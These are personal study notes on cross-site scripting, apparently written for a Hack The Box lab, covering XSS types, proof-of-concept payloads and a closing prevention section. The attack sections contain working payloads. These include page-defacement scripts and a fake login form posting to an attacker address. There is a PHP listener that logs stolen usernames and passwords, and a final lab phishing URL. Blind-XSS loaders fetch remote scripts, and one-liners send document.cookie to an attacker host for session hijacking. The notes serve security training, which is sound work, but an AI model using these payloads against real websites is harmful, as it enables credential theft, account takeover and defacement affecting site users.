# Cross-Site Scripting (XSS)

- XSS exploits flaws in user input sanitization and allow for injected scripts to be executed client-side.
- Improper user input sanitization → JS code injection → Client-side execution
- XSS can facilitate a wide range of attacks
    - Anything that can be executed through browser JavaScript code
- XSS executes JS within a browser; therefore is limited to the browser's JS engine

<aside>
📝

Note: XSS can only affect user executing injected script client-side

*XSS has lower impacts on the wen server’s backend*

</aside>

Some XSS Attacks

- Tricking user’s browser into unwilling sending their session cookie to attacker’s C2 server
- Tricking a browser  to execute malicious API calls
    - Like changing the user's password
- Displaying ads
- Bitcoin Mining
- Heap overflow in Chrome
    - JS payload can exploit a binary vulnerability in a browser itself
    - Enables sandbox escape → machine-level executions

# **Types of XSS**

- Stored XSS
    - Persistent
    - User input is stored in backend database
    - That input is displayed upon retrieval by anyone visiting site
    - Most dangerous
- Reflected XSS
    - Non-Persistent
    - User input is displayed (reflected) after processed by backend server
        - JS code returns and the browser or website executes it
    - Never stored on server backend database
- DOM-Based XSS
    - Non-Persistent
    - User input is completely processed client-side
    - Never reaches backend server
    - DOM is client-side only
        - JS used to change page source through [Document Object Model (DOM)](https://www.notion.so/XXS-2636c31c8f4a803ab403f099f2fb27d0?pvs=21)

## **Proof of Concepts**

Use `<script>alert(window.origin)</script>` instead of `<script>alert(1)</script>`

- Alert box would reveal URL executing the JS code

`<plaintext>`

- A single HTML tag
- Makes browser stop rendering HTML following the tag

`<script>print()</script>`

- Pops up the browser’s print dialog
- Least likely to be blocked by browsers

`<script>alert(document.cookie)</script>`

- Puts cookies in an alert box

### Targeting with Reflected XSS

- Check URL parameters
- Not stored in web server so
    - Deceive victim into sending URL containing XSS parameters themselves
    - Example: `http://example.com/index.php?id=<script>alert(1)<%2Fscript>`

### Exploiting DOM-Based XSS

- Unlike Stored or Reflected, no actual web requests are made and nothing is shown in page source
    - We see #(fragment) in URL instead; used to identify a section in document/page
    - User input only seen in Web Inspector (Inspect Element option)
- We can still trick victim into entering a URL with a DOM-Based XSS payload

`Source` &`Sink`

- “Source” refers to JS object taking user input
    - Can be input parameters
- “Sink” refers to JS function that writes user input into a DOM object on the page
    - This is where lack of sanitization can lead to XSS
    - Common JS “sink” functions:
        - `document.write()`
        - `DOM.innerHTML`
        - `DOM.outerHTML`
    - Common jQuery “sink” functions:
        - `add()`
        - `after()`
        - `append()`

Example (web app source code; not visible client-side)

```jsx
var pos = document.URL.indexOf("task=");
var task = document.URL.substring(pos + 5, document.URL.length);
```

- `task=` is the “source” and takes a URL parameter

```jsx
document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);
```

- Page uses `innerHTML` function to write `task` into the DOM named `todo`

### DOM-Based XSS Payload

- `innerHTML` does NOT allow for `<script>` tag
- The following payload will be allowed if user input is not sanitized:

**`<img src="" onerror=alert(window.origin)>`**

- `onerror` attribute tells JS to do the following if `img` is not found
- Because `src` if `img` is empty, error will occur
    - Causing the execution of `alert(window.origin)`

# **XSS Discovery & Exploitation**

<aside>
🚧

*XSS can be injected into any input in the HTML page*

*Not exclusive to HTML input fields*

*May also be in HTTP headers (if values are displayed in page): Cookie ,User-Agent, etc.*

</aside>

Scanners like Nessus, Burp Pro, and ZAP have two scan types:

1. Passive Scan
    - Reviews client-side code for DOM-based vulns
2. Active Scan
    - Sends all types of payloads to detect Stored and Reflected XSS
    - Checks page source to verify successful exploits

## Open-Source Tools

- [XSS Strike](https://github.com/s0md3v/XSStrike)
    - `python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"`
    - This tool will automatically identify vulnerable parameters
- [Brute XSS](https://github.com/rajeshmajumdar/BruteXSS)
- [XSSer](https://github.com/epsylon/xsser)

## Payloads

Online list of payloads:

- [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)
- [Payload Box](https://github.com/payloadbox/xss-payload-list)

Write your own Python script to automate sending these payloads

# **XSS Attacks In-Depth**

## Defacing

- Changing how a website looks for anyone visiting the website
- Common for hacker groups to prove themselves

Common HTML elements used:

- Background Color `document.body.style.background`
- Background `document.body.background`
- Page Title `document.title`
- Page Text `DOM.innerHTML`

Example Payloads:

`<script>document.body.style.background = "#ff0000"</script>`

- Makes page background red

`<script>document.title = 'You been hacked kekw'</script>`

- Changes title of the page
- Usually just changes the text appearing in browser tab

Removing an HTML element:

`web.com/form.php?id=document.getElementById('html element').remove()`

- add `<!--` to the end of entire payload to comment out the rest of the HTML
    - Remove any parenthesis right before the comment tag

### **Changing Page Text**

*Wrap these payloads around the <script> tag*

Using the `innerHTML` property:

`document.getElementById("DOM or HTML_element").innerHTML = "hacked lol"`

Using the jQuery functions:

`$("#DOM or HTML_element").html('hacked lol');`

Specific Example:

`document.getElementsByTagName('body')[0].innerHTML = "hacked lol”`

- Changing the entire body element
- [0] = first body element of that page

### Defacing 101

1. Prepare HTML code you want to display

```html
<center>
    <h1 style="color: white; background-color: black">hacked lol</h1>
    <p style="color: white; background-color: black">fire your devs
        <img src="https://upload.wikimedia.org/wikipedia/en/7/73/Trollface.png" height="25px" alt="trollface">
    </p>
</center>
```

1. Wrap it around your payload of choice

`<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 "color: white; background-color: black">hacked lol</h1><p style="color: white; background-color: black">fire your devs <img src="https://upload.wikimedia.org/wikipedia/en/7/73/Trollface.png" height="25px" alt="trollface"> </p></center>'</script>`

1. Download website HTML/source and try it locally first
2. Inject

Before:

![image.png](Cross-Site%20Scripting%20(XSS)%2026f6c31c8f4a8008a69dccf01c00d343/image.png)

After:

![image.png](Cross-Site%20Scripting%20(XSS)%2026f6c31c8f4a8008a69dccf01c00d343/image%201.png)

## Phishing

- XSS to inject fake login form
- User input is sent to attacker’s server

Fake login form example:

```html
<h3>Please login to continue</h3>
<form action=http://OUR_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```

- Then wrap this around `document.write();` and inject into vulnerable URL parameter

Removing an HTML element:

`web.com/form.php?id=document.getElementById('html element').remove()`

- add `<!--` to the end of entire payload to comment out the rest of the HTML
    - Remove any parenthesis right before the comment tag

### **Credential Stealing**

Need to set up an HTTP listener to receive data from the fake form

Simple listener with Netcat:

```bash
sudo nc -lvnp 80
```

Setting up a PHP listener server to avoid error messages for victim:

1. Create the php code

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
//name it index.php
```

1. Start the server

```bash
mkdir /server/path
cd /server/path
vi index.php #at this step we wrote our index.php file
sudo php -S 0.0.0.0:80

output:	PHP 7.4.15 Development Server (http://0.0.0.0:80) started
```

For the HTB lab, this is my final payload

`http://10.129.73.8/phishing/index.php?url=document.write('<h3>Please+login+to+continue<%2Fh3><form+action%3Dhttp%3A%2F%2F10.10.15.106><input+type%3D"username"+name%3D"username"+placeholder%3D"Username"><input+type%3D"password"+name%3D"password"+placeholder%3D"Password"><input+type%3D"submit"+name%3D"submit"+value%3D"Login"><%2Fform><!--`

## Session Hijacking

*Stealing a user’s session cookie to gain access without knowing victim’s credentials (aka Cookie Stealing attack)*

### Blind XSS Detection

*When vulnerability is triggered on a page we don't have access to*

Examples:

- Contact Forms
- Reviews
- User Details
- Support Tickets
- HTTP User-Agent header

Whether or not the field is vulnerable, the same output appears

![image.png](Cross-Site%20Scripting%20(XSS)%2026f6c31c8f4a8008a69dccf01c00d343/image%202.png)

**XSS payloads needs to send back an HTTP request to our attacker sever**

(out of band)

Loading a Remote Script:

`<script src="http://OUR_IP/script.js"></script>`

### Basic Session Hijacking

1. **Find a vulnerable input field through Blind XSS**
    
    
    URL Parameter payload for testing vulnerability:
    
    - This is all one line, injected as parameter input
    
    ```html
    <script src=http://OUR_IP></script>
    '><script src=http://OUR_IP></script>
    "><script src=http://OUR_IP></script>
    javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
    <script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script><script>$.getScript("http://OUR_IP")</script>
    ```
    

Setup a listener on attack side:

```bash
nc -lvnp 8080
sudo php -S 0.0.0.0:80
```

Output of a successful field:

![image.png](Cross-Site%20Scripting%20(XSS)%2026f6c31c8f4a8008a69dccf01c00d343/image%203.png)

*The payload made the vulnerable field send a request back to our IP*

1. **Exploit the vulnerable field**
    
    
    File payload for grabbing session cookie:
    
    ```jsx
    document.location='http://OUR_IP/index.php?c='+document.cookie;
    	//or//
    new Image().src='http://OUR_IP/index.php?c='+document.cookie;
    ```
    
    - Using the URL parameter payload from step 1, it will grab a js script file from attacker http server containing any of these one-liners
    
    - Make sure to set up the listener/http server
    
    Call the js script on attack server with this URL parameter payload:
    
    ```jsx
    "><script src=http://OUR_IP/script.js></script>
    ```
    
2. Use the stolen cookie
    - Using browser dev tools, cUrl, and other ways to change cookie header
    - We can impersonate the victim by setting our cookie header to theirs’

# Preventing XSS

*The most reliable countermeasure:*

**CODE REVIEW**

- Manually review both frontend and backend code
- Some vulnerabilities are missed in automated vulnerability assessment tools

### **Frontend solutions**

Input Validation

Implementation Example:

```jsx
function validateEmail(email) {
    const re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test($("#login input[name=email]").val());
}
```

- Regex validation of user input

**Input Sanitization**

Implementation Example:

```jsx
<script type="text/javascript" src="dist/purify.min.js"></script>
let clean = DOMPurify.sanitize( dirty );
```

- Using DOMPurify
- Escapes special characters like backslashes

**Direct Input**

- Never accepts user input directly within certain tags:
    - JavaScript code `<script></script>`
    - CSS Style Code `<style></style>`
    - Tag/Attribute Fields `<div name='INPUT'></div>`
    - HTML Comments `<!-- -->`

**Do Not Use**

- Avoid these JS functions:
    - `DOM.innerHTML`
    - `DOM.outerHTML`
    - `document.write()`
    - `document.writeln()`
    - `document.domain`
- Avoid these jQuery functions:
    - `html()`
    - `parseHTML()`
    - `add()`
    - `append()`
    - `prepend()`
    - `after()`
    - `insertAfter()`
    - `before()`
    - `insertBefore()`
    - `replaceAll()`
    - `replaceWith()`

These functions that allow changing raw text of HTML fields

### **Backend solutions**

**Input Validation**

Implementation Example:

```jsx
if (filter_var($_GET['email'], FILTER_VALIDATE_EMAIL)) {
    // do task
} else {
    // reject input - do not display it
}
```

- Matching input with PHP

**Input Sanitization**

- Using libraries for input sanitization
- `addslashes` php function escapes special characters with backslashes

**Output HTML Encoding**

- Encodes data before sending to browser for display
- Encoding special characters into HTML codes (e.g. `<` into `&lt;`)

**Server Configuration**

- Using HTTPS across the entire domain.
- Using XSS prevention headers.
- Using the appropriate Content-Type for the page, like `X-Content-Type-Options=nosniff`.
- Using `Content-Security-Policy` options, like `script-src 'self'`, which only allows locally hosted scripts.
- Using the `HttpOnly` and `Secure` cookie flags to prevent JavaScript from reading cookies and only transport them over HTTPS.

Lastly, 

**Set up a Web Application Firewall (WAF)**